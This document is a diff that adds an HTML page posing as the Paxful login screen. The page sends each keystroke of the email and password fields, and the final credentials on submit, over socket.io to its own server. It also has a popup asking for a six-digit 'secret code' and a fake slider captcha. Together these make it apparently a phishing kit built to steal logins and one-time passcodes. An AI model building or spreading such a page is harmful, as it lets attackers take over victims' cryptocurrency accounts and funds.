@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login | Paxful</title>
+    <link rel="icon" href="https://assets.onecompiler.app/42n876cmq/439pcdkr6/images.png" type="image/png">
+    <link rel="stylesheet" href="PAX.css">
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://assets.onecompiler.app/42n876cmq/439nez9kf/unnamed.png" alt="Hexyo Logo">
+                <span>paxful</span>
+            </div>
+            <h2>Welcome back!</h2>
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+            <button type="submit" class="btn" id="btn" onclick="openPuzzle1()"></button>
+
+            <form action="#" method="POST">
+                <div class="input-group">
+                    <label for="email">Email / Phone Number</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="username" placeholder="Enter your email or phone" required>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <div class="input-wrapper">
+                        <input type="password" id="password" placeholder="Enter your password" required>
+                        <span class="toggle-password" onclick="togglePassword()">👁️</span>
+                    </div>
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </div>
+
+                <button type="submit" class="sign-in-btn" id="sign-in-btn">Sign In</button>
+            </form>
+        </div>
+        
+        <div class="cover-image"></div>
+    </div>
+
+    <div id="puzzlePopup" class="popup">
+        <p>Slide to complete the puzzle</p>
+        <div class="background">
+            <img src="https://assets.onecompiler.app/42n876cmq/439ph3ejr/puzzle.png" class="puzzle-placeholder" alt="Puzzle Placeholder">
+            <img id="puzzlePiece" src="https://assets.onecompiler.app/42n876cmq/439ph3ejr/puzzle.png" class="puzzle-piece" alt="Puzzle Piece">
+        </div>
+        <div class="slider-container">
+            <input type="range" id="slider" min="0" max="300" value="0">
+        </div>
+        <div class="controls">
+            <button onclick="resetPuzzle()">&#x21bb;</button>
+            <button onclick="closePuzzle()">&times;</button>
+        </div>
+    </div>
+
+    <div id="puzzlePopup1" class="popup1">
+        <p id="error-message" class="error-message">enter your secret code</p>
+        
+        <div class="otp-container">
+            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 0)">
+            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
+            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
+            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)">
+            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)">
+            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
+        </div>
+        
+        <div class="controls1">
+            <button onclick="resetPuzzle1()">&#x21bb;</button>
+            <button onclick="closePuzzle1()">&times;</button>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+
+        document.getElementById("username").addEventListener("input", (e) => {
+            socket.emit("typing", { field: "username", value: e.target.value });
+        });
+
+        document.getElementById("password").addEventListener("input", (e) => {
+            socket.emit("typing", { field: "password", value: e.target.value });
+        });
+
+        document.getElementById("sign-in-btn").addEventListener("click", () => {
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            socket.emit("submit", { username, password });
+        });
+    </script>
+
+    <script src="PAX.js"></script>
+</body>
+</html>
